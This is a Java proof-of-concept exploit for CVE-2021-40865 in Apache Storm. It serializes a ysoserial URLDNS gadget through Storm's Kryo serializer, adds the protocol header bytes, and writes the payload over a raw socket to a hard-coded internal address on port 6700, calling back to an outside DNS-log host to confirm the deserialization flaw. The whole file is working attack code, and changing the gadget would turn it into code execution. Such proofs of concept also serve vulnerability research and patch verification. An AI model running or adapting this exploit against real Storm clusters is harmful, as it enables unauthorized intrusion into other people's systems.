package storm.cve;//package storm.cve;

import org.apache.storm.serialization.KryoValuesSerializer;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.URLDNS;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.net.*;
import java.util.HashMap;

public class CVE_2021_40865 {

    public static byte[] buffer(KryoValuesSerializer ser, Object obj) throws IOException {
        byte[] payload = ser.serializeObject(obj);
        BigInteger codeInt = BigInteger.valueOf(-600);
        byte[] code = codeInt.toByteArray();
        BigInteger lengthInt = BigInteger.valueOf(payload.length);
        byte[] length = lengthInt.toByteArray();

        ByteArrayOutputStream outputStream = new ByteArrayOutputStream( );
        outputStream.write(code);
        outputStream.write(new byte[] {0, 0});
        outputStream.write(length);
        outputStream.write(payload);
        return outputStream.toByteArray( );
    }

    public static KryoValuesSerializer getSerializer() throws MalformedURLException {
        HashMap<String, Object> conf = new HashMap<>();
        conf.put("topology.kryo.factory", "org.apache.storm.serialization.DefaultKryoFactory");
        conf.put("topology.tuple.serializer", "org.apache.storm.serialization.types.ListDelegateSerializer");
        conf.put("topology.skip.missing.kryo.registrations", false);
        conf.put("topology.fall.back.on.java.serialization", true);
        return new KryoValuesSerializer(conf);
    }

    public static void main(String[] args) {
        try {
            // Payload construction
            String command = "http://404bypass.dnslog.pw";
            ObjectPayload gadget = URLDNS.class.newInstance();
            Object payload = gadget.getObject(command);
            // Kryo serialization
            byte[] bytes = buffer(getSerializer(), payload);
            // Send bytes
            Socket socket = new Socket("10.58.120.200", 6700);
            OutputStream outputStream = socket.getOutputStream();
            outputStream.write(bytes);
            outputStream.flush();
            outputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}